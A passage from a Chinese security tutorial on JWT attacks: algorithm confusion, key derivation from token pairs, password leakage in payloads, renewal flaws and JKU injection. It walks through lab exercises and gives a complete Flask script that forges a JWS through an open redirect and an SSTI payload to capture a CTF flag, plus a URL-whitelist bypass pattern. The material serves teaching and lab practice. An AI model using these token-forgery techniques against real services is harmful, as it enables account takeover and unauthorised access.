    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6c2lJc1ZxQUtTcE9uT3hNS3JJMApoVDNwOG0vTkszVm9lakZudDRIeDJDRnp2SnNaNC85bW1vSVZ3aS9uWFlyN050TlY3c3RPU1M0TUd6WWRKNTd0CjR2ODNCOWg3dUkxZmRLU3ArTCtjaXNnMzFTMFdtNUIvTERudnVBQkZNY1NoSitES1RnRVlmTEhhRzMxSnVkbHkKSmRuZmdOSUlhMFhMK3diR2g3WHNoZjhSdHpSOEZDMkRmQXBYLytLWFlObkh4blRLVFBYbDV1bkJnQ3h5bnkybgoyQ3dvQ0lpWWV0N3M3WDFjM3Fod2t0V2s2eEpUbXZrcmQ4NUtCbERTeUVqQmhFUFBYcmJWZnFvOHNOeGtZK0UyCkZYSW9QSXQ4bS9WU1hsc0t5WnBqcGZYVEpKWm8vSXFhekFsMVhCVzZiandXanh3ZWUwWGJ5dDdNMS8xZFRLamEKQXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="
}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030433000-9f10ae56-bfdf-49a5-9e21-278bfcb3f140.png-w331s)

Step 8：捕获请求数据报并将其发送到repeat模块

![](https://images.seebug.org/content/images/2023/10/23/1698030433000-d1cd0d2d-e3a0-41d6-9e18-d3a4c80dc972.png-w331s)

此时直接请求/admin是无法请求到的

![](https://images.seebug.org/content/images/2023/10/23/1698030433000-4dc55f9b-87c1-4c3a-8e09-ab85820197fb.png-w331s)

Step 9：随后修改alg为HS256，修改sub为administrator并进行Sign操作

![](https://images.seebug.org/content/images/2023/10/23/1698030434000-6663cf4d-3f62-4d0b-80d5-6092355fed46.png-w331s)

Step 10：重新发送数据包可以看到回显成功

![](https://images.seebug.org/content/images/2023/10/23/1698030434000-2ddd0856-77a1-422a-9dac-f4cc5578ff24.png-w331s)

Step 11：请求敏感连接删除用户完成解题

![](https://images.seebug.org/content/images/2023/10/23/1698030434000-ce86d5e6-da90-4997-b756-32e1f8958114.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030434000-1988280a-1986-4169-bd8f-9fec06263fff.png-w331s)

##### 令牌派生公钥

###### 基本介绍

在公钥不可用的情况下您仍然可以通过使用jwt _ forgery.py之类的工具从一对现有的JWT中获取密钥来测试算法混淆，您可以在rsa_sign2n GitHub存储库中找到几个有用的脚本

[https://github.com/silentsignal/rsa_sign2n](https://github.com/silentsignal/rsa_sign2n "https://github.com/silentsignal/rsa_sign2n ")

![](https://images.seebug.org/content/images/2023/10/23/1698030434000-2ddbb72a-e5ee-4277-86f1-36e4323129ad.png-w331s)

###### 简易示例

靶场地址：

[https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key "https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key ")

![](https://images.seebug.org/content/images/2023/10/23/1698030434000-3a1da2c9-dab4-4426-8ba2-c3fe57c86319.png-w331s)

Step 1：安装常规操作登录登出，再登录，获取两个JWT

![](https://images.seebug.org/content/images/2023/10/23/1698030434000-aa5697d3-2759-47c0-b5cc-81300d492b37.jpg-w331s)

随后将其放到Port提供的docker工具里面运行，运行的命令如下

```
docker run --rm -it portswigger/sig2n <token1> <token2>
```

![](https://images.seebug.org/content/images/2023/10/23/1698030435000-0cf788f8-0fdb-4edc-95fa-a68e05f5fc4d.png-w331s)

jwt _ forgery.py脚本会输出一系列token的存在情况值

![](https://images.seebug.org/content/images/2023/10/23/1698030435000-7971f5ef-8dea-4991-a623-f70588480397.png-w331s)

Step 2：这里我们尝试每一个Tempered JWT，Port这里给了提示说是X.509 形式的，所以我们只需要将X.509形式的JWT进行验证即可，当Response回应200时代表token是有效的，若为302则代表了重定向，下图是一个成功的案例

![](https://images.seebug.org/content/images/2023/10/23/1698030435000-6e76d5af-85d4-489e-a1a6-5fa164176bbb.jpg-w331s)

Step 3：将JWT的Base64编码拿过来先放到记事本里面暂存，在Burpsuite的JWT Editor Keys点击New Symmetric Key，将上面的Base64编码拿过来替换此对称密钥的k值，生成对称密钥之后进行和之前攻击一致的Sign操作

![](https://images.seebug.org/content/images/2023/10/23/1698030435000-b2d0a383-d6a8-4b41-a434-edaa0874492f.png-w331s)

##### 敏感信息泄露

###### 基本介绍

JWT敏感信息泄露是指攻击者通过某种方式获取了JWT中包含的敏感信息，例如:用户的身份、权限或其他敏感数据，这种攻击可能会导致恶意用户冒充合法用户执行未经授权的操作或者访问敏感信息，常见的JWT敏感信息泄露方式包括：

*   窃取JWT：攻击者通过窃取JWT令牌来获取其中的敏感信息，这可以通过窃取存储在客户端的JWT令牌或者通过攻击服务器端的JWT签名算法来实现
    
*   窃取载荷：攻击者可以在传输过程中窃取JWT的载荷部分，这可以通过窃听网络流量或者拦截JWT令牌来实现
    
*   暴力破解：攻击者可以通过暴力破解JWT签名算法来获取JWT中包含的敏感信息

###### 简易示例

靶场地址：[https://authlab.digi.ninja/Leaky_JWT](https://authlab.digi.ninja/Leaky_JWT "https://authlab.digi.ninja/Leaky_JWT")

![](https://images.seebug.org/content/images/2023/10/23/1698030435000-db2e1292-caeb-469c-b388-ecdbb7d59889.png-w331s)

靶场JWT信息如上所示，而在实战中我们可以去抓包，如果抓到的数据包中有类似这样的JWT认证那我们就可以直接拿去解密了，我们拿到的数据是这样的：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6ImFkbWluIiwicGFzc3dvcmQiOiIyYWM5Y2I3ZGMwMmIzYzAwODNlYjcwODk4ZTU0OWI2MyIsInVzZXJuYW1lIjoiam9lIn0.6j3NrK-0C7K8gmaWeB9CCyZuQKfvVEAl4KhitRN2p5k
```

上面是一个标准的JWT认证的格式，其包含Header、Payload、Signature三个部分，每个部分之间又以"."号分割，他这里的JWT认证是经过base64加密的，所以我们这里先要拿到base64解密网站去解密一下

[https://base64.us/](https://base64.us/ "https://base64.us/")

![](https://images.seebug.org/content/images/2023/10/23/1698030435000-bcd9e8a5-4aaf-438c-85b8-f34b0ddeb59e.png-w331s)

在这里我们可以看到payload部分的数据解密出来后包含password字段信息，后面解出来的是一串MD5数据，之后我们将其拿到MD5在线解密网站进行解密操作：

![](https://images.seebug.org/content/images/2023/10/23/1698030436000-eb6101e6-6520-4c25-a72f-973170db1241.png-w331s)

随后得到密码Password1并使用其作为密码，使用joe作为用户名进行登录操作：

![](https://images.seebug.org/content/images/2023/10/23/1698030436000-11d524b7-8e4b-42cb-9313-2e30a4371835.png-w331s)

随后成功登录：

![](https://images.seebug.org/content/images/2023/10/23/1698030436000-565049fe-8178-4310-8074-2950ae4b5ff6.png-w331s)

##### 密钥硬编码类

###### 基本介绍

JWT中的密钥是用于对令牌进行签名或加密的关键信息，在实现JWT时密钥通常存储在应用程序代码中即所谓的"硬编码"，这种做法可能会导致以下安全问题：

*   密钥泄露：硬编码的密钥可以被攻击者轻松地发现和窃取，从而导致JWT令牌被篡改或解密，进而导致安全漏洞
    
*   密钥管理：硬编码的密钥难以进行集中管理，无法灵活地进行密钥轮换、密钥失效等操作，从而增加了密钥管理的难度
    
*   密钥复用：硬编码的密钥可能会被多个应用程序或服务共享使用，这可能会导致一个应用程序出现安全漏洞后，其他应用程序也会受到影响

###### 漏洞案例

JWT密钥硬编码：

![](https://images.seebug.org/content/images/2023/10/23/1698030436000-35eedb39-37a3-4af0-9696-3a6cf3c1582d.png-w331s)

#### 会话续期

##### 续期机制

JWT(JSON Web Token)的续期机制是指在JWT过期之后通过一定的方式来更新JWT令牌，使其可以继续使用以减少用户需要频繁重新登录的情况，常见的JWT续期机制包括：

*   刷新令牌(Refresh Token)：在用户登录时除了获取JWT令牌外还会获取一个刷新令牌，当JWT令牌过期时可以使用刷新令牌来获取新的JWT令牌，刷新令牌的有效期通常比JWT令牌长并且会在每次使用后更新有效期以确保安全性
    
*   延长有效期：在JWT令牌过期之前服务器可以根据某些条件来判断是否需要延长JWT令牌的有效期，例如:用户在活跃状态、令牌过期时间较短等，如果满足条件服务器将发送一个新的JWT令牌以替换原来的JWT令牌
    
*   自动续期：在使用JWT令牌时服务器可以检查JWT令牌的有效期并在需要时自动为其续期，这通常需要与前端应用程序进行配合以确保用户可以无缝地使用应用程序，而不需要重新登录

##### 续期问题

###### 无限使用

用户登录成功获取到一个JWT Token，JWT Token由包含算法信息的header和包含用户非敏感信息的body以及对header和body数据签名后的sing值拼接base64后生成，body中包含用户token失效时间戳exp(默认1小时)、用户id标识u

![](https://images.seebug.org/content/images/2023/10/23/1698030436000-0d337055-e517-4812-9464-0060b3285699.jpg-w331s)

JWT Token有效期为1小时

![](https://images.seebug.org/content/images/2023/10/23/1698030436000-d41b7dc0-f0ca-4dd8-8b54-cc6b181a417d.jpg-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030436000-daef7a79-4596-4c31-a80c-cc670d0b6595.jpg-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030436000-e5d826a1-274d-46b7-b8df-bb52d1606a4c.jpg-w331s)

但是在过期后发现使用之前过期的JWT Token可以继续进行会话操作

![](https://images.seebug.org/content/images/2023/10/23/1698030436000-0d337055-e517-4812-9464-0060b3285699.jpg-w331s)

###### Token刷新缺陷

JWT Token在续期设计时由于代码编写错误将新老token更新逻辑设计错误，使得新Token和老Token一致，导致JWT 续期失败

![](https://images.seebug.org/content/images/2023/10/23/1698030437000-f1e8eee6-b99a-42f2-95e4-312cc2b6b38d.jpg-w331s)

测试效果如下：

![](https://images.seebug.org/content/images/2023/10/23/1698030437000-f1afdf09-aa25-4ae0-a809-347d9c78d05f.jpg-w331s)

###### N个新Token生成

功能测试时发现JWT Token首次生成时默认失效时120分钟，续期业务逻辑中仅在JWT Token的后1/3时间，也就是80-120分钟时进行续期操作，在此期间用户的Token会进行刷新操作，使用新的Token请求到服务器段，服务器端会返回一个新的JWT Token到前端，供前端使用，但是在续期期间旧的Token可以无限制生成多个有效的JWT Token，存在一定程度上的被利用风险

![](https://images.seebug.org/content/images/2023/10/23/1698030437000-29a6c135-dc83-412c-856c-efe1f17d2b69.jpg-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030437000-f408cd79-3511-44b9-8d3e-2a62c8ac5fba.jpg-w331s)

#### **JKU攻防**

**JKU攻击场景**

攻击场景如下：

*   攻击者使用伪造的JWS访问应用，JKU字段指向自己控制的服务器
    
*   应用程序得到JKU后对恶意服务器进行访问得到伪造的JWK
    
*   攻击者的JWS成功得到验证，进而可以越权访问应用

![](https://images.seebug.org/content/images/2023/10/23/1698030437000-13d10266-7945-4cfc-83c9-b1b6808dc6bb.jpg-w331s)

为了保证JWK服务器的可信，应用程序会对JKU的指向增加各种防护措施，比如对URL进行白名单过滤，想要攻击成功也并非容易的事

##### JKU攻击方式

###### 绕过jku地址过滤

如果过滤方式比较简单只按照规定长度检查域名的话则很容易绕过，绕过方式由具体场景而定

```
https://trusted  => http://trusted@malicious.com
```

###### 可信服务自身漏洞

**A、利用文件上传漏洞**

如果对JKU做了域名限制，利用文件上传就不会有影响了，攻击者可以上传自己生成的JWK文件，然后修改JKU指向此文件即可

**B、利用重定向类漏洞**

重定向漏洞的利用方式可以参考下图

![](https://images.seebug.org/content/images/2023/10/23/1698030438000-ee692941-04f4-441e-9b90-cc15077f7d67.jpg-w331s)

攻击者使用恶意JWS访问应用程序，应用程序向得到JKU并访问JKU指向的链接，此时可信服务器返回一个重定向使得应用程序从恶意服务器中获取JWK

![](https://images.seebug.org/content/images/2023/10/23/1698030438000-05608865-1d7b-4766-839f-8ae008c530ca.jpg-w331s)

**C、利用CRLF注入漏洞**

攻击者在JKU中嵌入CRLF，构造HTTP报文使得应用程序得到的返回内容被攻击者控制，攻击者将返回内容控制为自己生成的JWK，即可绕过验证，具体利用场景如下：

![](https://images.seebug.org/content/images/2023/10/23/1698030438000-5a70d4e6-ee0e-4982-8a79-b3faaf37c2fb.png-w331s)

##### JKU利用实例1

###### 靶场地址

[https://attackdefense.com/challengedetails?cid=1424](https://attackdefense.com/challengedetails?cid=1424 "https://attackdefense.com/challengedetails?cid=1424 ")

![](https://images.seebug.org/content/images/2023/10/23/1698030438000-51ab7f19-d865-41aa-9ff3-2a222f4bee84.png-w331s)

###### 场景描述

1.攻击者IP地址：192.79.23.2

2.局域网内服务：192.79.23.3的8080端口包含了一个基于CLI的JWT API，该API提供如下三个功能

*   /issue ：访问后生成一个JWT
    
*   /goldenticket：得到goldenticket，但是需要身份为admin才能获取
    
*   /help：查看一些帮助

3.实验的目标是获取goldenticket

###### 实验过程

Step 1：使用namap扫描目标主机

```
nmap 192.79.23.3
```

![](https://images.seebug.org/content/images/2023/10/23/1698030438000-202b6873-1ff3-440b-ae4a-ecaff1082bc7.jpg-w331s)

Step 2：深度探测服务发现目标主机允许着Apache和Python简易Web服务

![](https://images.seebug.org/content/images/2023/10/23/1698030438000-70603f2c-1b40-49cc-a90e-e97a4930b6ee.jpg-w331s)

Step 3：请求REST接口

![](https://images.seebug.org/content/images/2023/10/23/1698030438000-49eeb261-cad8-428a-a1c9-ad52b6da81f4.jpg-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030439000-893c10b8-33e8-4dce-b281-b5b508fcba0e.jpg-w331s)

Step 4：获取JWT Token

![](https://images.seebug.org/content/images/2023/10/23/1698030439000-dd148941-71aa-4f40-92b2-6ede949c7a54.jpg-w331s)

Step 5：JWT Token解码

![](https://images.seebug.org/content/images/2023/10/23/1698030439000-3faf00ef-6812-4028-9806-068a1d56db3c.jpg-w331s)

Step 6：获取JWKS.json

![](https://images.seebug.org/content/images/2023/10/23/1698030439000-670647ef-a3c2-4479-946f-ae5da252e982.jpg-w331s)

Step 7：尝试使用获取到的Token来获取golden Token，发现失败，提示必须要Admin

![](https://images.seebug.org/content/images/2023/10/23/1698030439000-39d5b5bd-17d1-4070-ac7a-da1e421fcb62.jpg-w331s)

Step 8：创建一个公钥-私钥对

![](https://images.seebug.org/content/images/2023/10/23/1698030439000-6e874bfd-e893-4bde-9beb-37ab76f4b633.jpg-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030439000-1c6515e3-d5f6-436c-b2f5-44fd8f92793d.jpg-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030440000-50198b01-ffc6-4701-955b-e9a069b5d080.jpg-w331s)

Step 9：使用交易对创建虚假Token

![](https://images.seebug.org/content/images/2023/10/23/1698030440000-d4a2d26d-eef4-4c7c-bd1f-527259a75336.jpg-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030440000-d1549f0c-f5f0-44b7-bbf8-df637087bf9e.jpg-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030440000-52730286-f8b5-4687-9aba-563d23af31c3.jpg-w331s)

Step 10：更改用户名为admin同时更改jku的地址连接

![](https://images.seebug.org/content/images/2023/10/23/1698030440000-d43c5ffd-f076-48c5-82c1-c527484a9185.jpg-w331s)

Step 11：再次尝试获取jwks.json的信息

![](https://images.seebug.org/content/images/2023/10/23/1698030440000-28ad6553-e86a-4622-9c95-1854e694f0ea.jpg-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030441000-1162fe56-1734-4d68-9a96-f347b13d8c57.jpg-w331s)

Step 12：修改n和e的值并开启一个监听服务

![](https://images.seebug.org/content/images/2023/10/23/1698030441000-cadc281e-096a-4a0f-890a-9e18d276f673.jpg-w331s)

Step 13：使用虚假的token去获取glodenticket

![](https://images.seebug.org/content/images/2023/10/23/1698030441000-c6a57369-ac5d-41e5-983c-3c7c6cb9b861.jpg-w331s)

##### **JKU利用实例2**

###### 场景描述

1.  5000端口存在返回JWS的API，JWS中存在JKU，JKU存在白名单过滤机制，限制在localhost域
    
2.  5000/check_jws?payload=可以进行JWS的检查并且展示Payload，部分内容存在SSTI漏洞
    
3.  5001/vuln/JWK可以得到JWK
    

需要利用重定向通过验证然后利用SSTI拿到flag

###### 实践过程

Step 1：访问5000端口返回JWS，可以看到里面的JKU指向 [http://localhost:5001/vuln/JWK](http://localhost:5001/vuln/JWK "http://localhost:5001/vuln/JWK")

![](https://images.seebug.org/content/images/2023/10/23/1698030441000-71ef5d5e-fad9-474e-9326-7ac758ccfb29.png-w331s)

Step 2：访问 [http://localhost:5001/vuln/JWK](http://localhost:5001/vuln/JWK "http://localhost:5001/vuln/JWK") 得到JWK

![](https://images.seebug.org/content/images/2023/10/23/1698030441000-f22bc678-2aa5-4127-ad2b-a14ec6c45bad.png-w331s)

但是这里的JKU被白名单限定在了localhost域，无法直接修改JKU指向我们自己的服务器，下面再次回顾一下JKU的利用手段

*   存在文件上传
    
*   存在重定向
    
*   存在CRLF注入

Step 3：在这里我们选择重定向利用，通过扫描目录可以发现/vul/redirect API，直接访问会回显bad params，参数名我们是不知道的，所以需要fuzz API的参数，可以使用下面的字典得到参数endpoint=

[https://github.com/ptswarm/ptswarm-twitter/blob/main/2020-11-30-open-redirect-params.txt](https://github.com/ptswarm/ptswarm-twitter/blob/main/2020-11-30-open-redirect-params.txt "https://github.com/ptswarm/ptswarm-twitter/blob/main/2020-11-30-open-redirect-params.txt")

```
/vuln/redirect?endpoint=
```

Step 4：使用python jscrypto库生成jwk

```
def generate_key():
   key = jwk.JWK.generate(kty='RSA', size=2048)
   print(key.export_public())
   print(key.export())
```

```
{"e":"AQAB","kty":"RSA","n":"1cOFAHlq4MjGXJztC1-H8RI0D0TgYw6UyZgXAv-Gg5t7DuPa9ssqw8h_z04wusMJ9GwN71DqPtijyjpblaKcKSmJN61PCPVjthkF88BfvZ7SFQjA-XVuEsFwOGOfvtmWQhRJmNAvZt_y9UfOe35EleeAOWtNkYQKa-NALu0-D_mLSuxNExbxCymqwkuZVTSrHdUyul-ohReTdjx8hJAVOsV4yRq7VIrblftLMTSlD3nUrPrsZNZf77ysAdD4gEffjCL7Osp0cjufJJlTndBhh-7I5l2rgcNQpsxSwYE_jegAQUIjRveVdq6CzXj104uYGPg3qda1xIi3VyOsb4wfxQ"}
{"d":"VtSV6Qxo8qf7k1EXJMCIWs83IGCs-O_KVl0WM9yRylHU2caKgici1uZRrGapeqORHpzpyCVJEYA0gAfWfeDQqBO8LkaSzSPIfgaKGWoyObcSxQKKSIp_zNSQfgdRs1d1JqBRCOa_6nzblvC1Ggq_V1jzB9_jYVGOXiawQp-RzzCjRt6_BSr7Hg2xC0v_chwUt_yBhvDGz5x0rbspYcBL0OzI1hhZ1Tujk3MRrMfbIvBeoyRb_582UYQBc886SmAF6ue3eBc0v15mAX7qptCb7RLOVBYJwA-eYGktll9Orx-IIvy1GJpZdCV7FBGh-1AlCgM2O0KyBAwT3kRA1PYUgQ","dp":"gu2vc9u13DNV1PUF0Zk5lliLQjzhsRqOwl9drbdUQ7JgkyVzfccZ8QhfrHVjgAFzD54I1zoNewXi-4jHts4O3ud1QOvt0tOJM-2OokFg29i0GoSXVT05IHb6VAmjAcfiC65SoS7sTm-V0oPp0DLswstGbk5zsAn2JL2RjBNYsz0","dq":"MsgjIE3OYNQ6HtjjeBIJrG7eAAProYzqIvhNhBK4vfoEiA4V-1GPw2Gxn9xkvzdXFWRM0eih8Pu07-CgiqYGfkUSgkvmKynvr_oH8stZ-wKZMs9jsDsBuV0y6CQUKiFRTgWkNw3o6408XUwF5K46oAjtp0GUG-CNNNoIc45jN0E","e":"AQAB","kty":"RSA","n":"1cOFAHlq4MjGXJztC1-H8RI0D0TgYw6UyZgXAv-Gg5t7DuPa9ssqw8h_z04wusMJ9GwN71DqPtijyjpblaKcKSmJN61PCPVjthkF88BfvZ7SFQjA-XVuEsFwOGOfvtmWQhRJmNAvZt_y9UfOe35EleeAOWtNkYQKa-NALu0-D_mLSuxNExbxCymqwkuZVTSrHdUyul-ohReTdjx8hJAVOsV4yRq7VIrblftLMTSlD3nUrPrsZNZf77ysAdD4gEffjCL7Osp0cjufJJlTndBhh-7I5l2rgcNQpsxSwYE_jegAQUIjRveVdq6CzXj104uYGPg3qda1xIi3VyOsb4wfxQ","p":"82Nu0AhRyqM1AMEOhR-Ld1s1FEDFYPaJlLTsyXeSsdJFERnKMAQ9FW49exwjNprvw5fgB7BkL5JtAO9b1OjIcz2SBZmP1OgED_69l-LrQ1xT_nczpiMeYvkv9Etdv1njK01jBRZEVudG4Qr1tiDI654Yr4dNIG8db3tdnk_WVqU","q":"4Ncc9ZrEYMIrbc5MvK3ywpy8AvBTHET3hgJKlRYvrU8DHUYUbq4KZK6O4h1Xv3TrSxWEwn1Z7VmWJcybS9S2khmt32OF81eG9-aty0XZtxgulRe8wCi2KCzDmDZzJ0kCcchZUr3Chj8FeXOwdJH1G9ZQUiwgMZ0Fu0qQVi2ReqE","qi":"RbZJiXGM4NBvyoBbEt0Eg1Sw22bEmQqpzYt16AcLjrpl_MTDGntuaOMhN7a3I4n3BoeaPytEy-I41UVLu0wyGYz91RtZWrFNvwd1R2TNvm5MfP5Xsr6hKSaDvAkvOZbg83VDXO2HeJ9ot6WwRZTKlivhLhJV-KxRX1hCbsv_VoU"}
```

我们需要伪造JKU并且在JWS解密后的内容中附加上SSTI payload，比如:{{config}}

```
jku = '[http://localhost:5001/vuln/redirect](http://localhost:5001/vuln/redirect)?endpoint=[http://localhost:5002/hack](http://localhost:5002/hack)' #localhost:5002 its own server, 5001 server with vuln open redirect
payload = '{{config}}'
key = jws.JWK(**json.loads(app.config['all_key']))
jwstoken = jws.JWS(payload.encode('utf-8'))
jwstoken.add_signature(key=key,alg='RS256',protected=None,header=json_encode({"kid": key.thumbprint(), 'jku':jku, "alg":"RS256"}))
sig = jwstoken.serialize()
```

JWK文档：JSON Web Key (JWK)

[https://jwcrypto.readthedocs.io/en/latest/jwk.html#json-web-key-jwk](https://jwcrypto.readthedocs.io/en/latest/jwk.html#json-web-key-jwk "https://jwcrypto.readthedocs.io/en/latest/jwk.html#json-web-key-jwk ")

```
>>> ka
<jwcrypto.jwk.JWK object at 0x7f7cd6062400>
>>> jwstoken
<jwcrypto.jws.JWS object at 0x7f7cd64ebdf0>
>>> jwstoken.add_signature(key=key,alg='RS256',protected=None,header=json_encode({"kid": ka.thumbprint(), 'jku':jku, "alg":"RS256"}))
>>> jwstoken.serialize()
'{"header":{"alg":"RS256","jku":"[http://localhost:5001/vuln/redirect](http://localhost:5001/vuln/redirect)?endpoint=[http://localhost:5002/hack](http://localhost:5002/hack)","kid":"BYa3XpycMhDud1d-fYTijehS75jH90eTPxVYdUx8DqA"},"payload":"e3tjb25maWd9fQ","signature":"kwNzA48stR8tqbceOxHvHUyNCB9dzx02mPLRLpd9cjD5vzFio5rBMEIraLEp8WwLaH1T_Nofz7e2ToPCdWFS5nGv6jcGCJ9DrFMwL9vq4M6pfTLE7hKlGDtE7iFAIvZqL4MEAx7IdSC07zd4yTRNBy48q64yXEMqA8HigvETS14_DYfiDDkSkHNSxLTuItI8qOxhfLIj1UVTZMci1mi5PQ00R66q5RPFsy-6v6ZIrRjPkeODc4DIlzpv525NkREMcCrAgpb7XvrV1eVWJMWDwkZQoXf6XgJapvhRveegk9GYkLETbz3Lqwh13KNNZw9doVSqL1oyRhjxgDHyT1cQlg"}'
```

使用Flash构建web服务，访问/hack即返回伪造的JWK，完整脚本如下：

```
from flask import Flask, request, redirect, jsonify, send_from_directory
from jwcrypto import jwk, jws
from jwcrypto.common import json_encode
import os
import json
import requests, re
app = Flask(__name__)
app.config['pub_key'] = '{"e":"AQAB","kty":"RSA","n":"oBbyWuGxj4wqlVjqcpNh3ZKYTjVXWINNdn8zaJgJdPa0Wt286cE4wExWAV03Kuma7bh8yK5SgY2bte8mdjpcte5T1iOtqWTXDP5XbXQvzLPas1VVvzcMwdsMs4-mkuV6HCYaj7Sbent7Bvx_4aY8qxrIBSuqf4NBP38iE_Bkuzo_OeGtsz0f5KECUPDV-Tum1KDuiwCDt6Jmef_xAWUmAqJv9nK0GLnNceIDXmw775Gi26KxDl7g2ak22pNCEFBKbZqQak4cTeZJfNR-oUZqPXFGO9i2yZJ_G7iN-1JxSPTyqyKnG5Z16d7l1Q_TFP1btPMFu9qS_bdbnkcMxURoBQ"'
app.config['all_key'] = '{"d":"AaOagaGz7rNRsEvDwr6NjvY0RwC2zzow7dipjxWXazIncJK6n24SBa4CZ2sr6G2R34M3C9r1D0yC3p7_NtCsKFSzWQrueUCGDyT_gihhYOgqghGKmjWXFNkITUJYQ0LEOEuPlA8WVG-1N8IYERhhoKLaj2r-COYwIdVMZQXeEiinXLfCVJCEtMMVNBMRfyUoY4_siQ6vMQGxJsHn8XOE2zsMnkreG7kPE-c0UrmsdnhmmyNFtegbS8dej4eH0Xy1txg81wTQSyGUru10QaFYVVAOhRFmdVNvSNWW3uL1guAOgLg8Y17FPnz1FiUGhflTeEsWwcKlVWl7QF0Bel-e1Q","dp":"nAk_O5Qi5HQRhgcsNZsGgFeEeErPn5CoXFx1DhANVbQwuNU-19P29wR4gSaDfexoLLaDXrw50g-ufmCLbz9r461LcPdmD6g9okstgPF38heLhjyTuA84xDu16sCX0ltpxWOWzhRkBeI0uhE1mjXtD7Uk9KUX5Y5SQK6MPZmVsoM","dq":"MznXQhv8h65iqwxzfPj3QwK6s9JvIR4IHnur2t3GYaCd-RG5fGSigkClUeG8TUlxViOr5ElbGsATWOzqAlr_CwTPCwEg9lcL5AKEHOy94k5CfAWMr1csa6Pp6bQJkveDf_c87s2Z1zYn6cJmJZiEJADocRyyUJ_mnh6wpvS7tgs","e":"AQAB","kty":"RSA","n":"oBbyWuGxj4wqlVjqcpNh3ZKYTjVXWINNdn8zaJgJdPa0Wt286cE4wExWAV03Kuma7bh8yK5SgY2bte8mdjpcte5T1iOtqWTXDP5XbXQvzLPas1VVvzcMwdsMs4-mkuV6HCYaj7Sbent7Bvx_4aY8qxrIBSuqf4NBP38iE_Bkuzo_OeGtsz0f5KECUPDV-Tum1KDuiwCDt6Jmef_xAWUmAqJv9nK0GLnNceIDXmw775Gi26KxDl7g2ak22pNCEFBKbZqQak4cTeZJfNR-oUZqPXFGO9i2yZJ_G7iN-1JxSPTyqyKnG5Z16d7l1Q_TFP1btPMFu9qS_bdbnkcMxURoBQ","p":"0-jzleXm-XbQe_gjrKqFsQUypSjtVX2NJ1ckF5op0qE1XiLETHg0C-woMuEymyW-vqRAbgA5yx4pVhlmJTPkv8TVsc9OYsz1H1cswiI-I73uLJ1wgUk_4mapa7K10Mrsw2X9AZpmiP7ntc4OwVdJ7BjUoY587IbZrV0yVCKgeYM","q":"wWXeDP796mxedqUActwBTCQCR3uNjbmOINMZY2CR0DuxCa9AX8V3VZEQVUj1Q6R8o4ixrQywQy1R902Kc9dCQqBkwF4WfybzhkfwiVcf8Yy3bqZzEoGCEbs2KVnYX7J3EBIfgEQVXb_G5ZeOvWzgSTi11e1_kdcUXdANiGtISdc","qi":"MNo8DyDds5N6gw6gmA17Iu0scH5i2n30oS0nDxFp0tKqfd5WAjF7J3P_uESwzW8AvncAm7HtDBd-KEHipcOcm7rPEdfBKKhyo3Q25chBCvRPvVcslmML30p3p0_F26yd5ThHWoo3UmHNoPLiMNZN3oRsCe1w2jity3YVvZDhu48"}'
def generate_key():
   key = jwk.JWK.generate(kty='RSA', size=2048)
   print(key.export_public())
   print(key.export())
@app.route('/') def index():
   jku = '[http://localhost:5001/vuln/redirect](http://localhost:5001/vuln/redirect)?endpoint=[http://localhost:5002/hack](http://localhost:5002/hack)'    payload = '{{config}}'
   key = jws.JWK(**json.loads(app.config['all_key']))
   jwstoken = jws.JWS(payload.encode('utf-8'))
   jwstoken.add_signature(key=key,alg='RS256',protected=None,header=json_encode({"kid": key.thumbprint(), 'jku':jku, "alg":"RS256"}))
   sig = jwstoken.serialize()
   return sig
@app.route('/hack') def hack():    with open('tmp.file', 'w') as file_write:
       file_write.write(jwk.JWK(**json.loads(app.config['all_key'])).export_public())
   uploads = os.path.join(os.path.abspath(os.path.dirname(__file__)))
   return send_from_directory(directory='.',filename='tmp.file')
@app.route('/get_flag')
def get_flag():
   payload = index()
   answ = requests.get('[http://localhost:5000/jws_check](http://localhost:5000/jws_check)',params={'payloads':payload}).text
   flag = answ
   flag = re.findall('VolgaCTF{.+?}', answ)[-1]
   print(flag)
   return flag
if __name__ == '__main__':
   app.run(port=5002, host='0.0.0.0')
```

#### 工具集合

##### jwt_tool

###### 项目地址

[https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool "https://github.com/ticarpi/jwt_tool")

![](https://images.seebug.org/content/images/2023/10/23/1698030441000-91f61e3b-fe08-40ea-94c1-bbf5aae76045.png-w331s)

###### 主要功能

1、检查令牌的有效性

2、测试已知漏洞：

*   CVE-2015-2951：alg=none签名绕过漏洞
    
*   CVE-2016-10555：RS / HS256公钥不匹配漏洞
    
*   CVE-2018-0114：Key injection漏洞
*   CVE-2019-20933 / CVE-2020-28637：Blank password漏洞
*   CVE-2020-28042：Null signature漏洞

3、扫描配置错误或已知漏洞

4、Fuzz声明值以引发意外行为

5、测试secret/key file/public key/ JWKS key的有效性

6、通过高速字典攻击识别低强度key

7、时间戳篡改

8、RSA和ECDSA密钥生成和重建(来自JWKS文件)

9、伪造新的令牌头和有效载荷内容，并使用密钥或通过其他攻击方法创建新的签名

###### 使用说明

[https://github.com/ticarpi/jwt\_tool/wiki/Using-jwt\_tool](https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool "https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool")

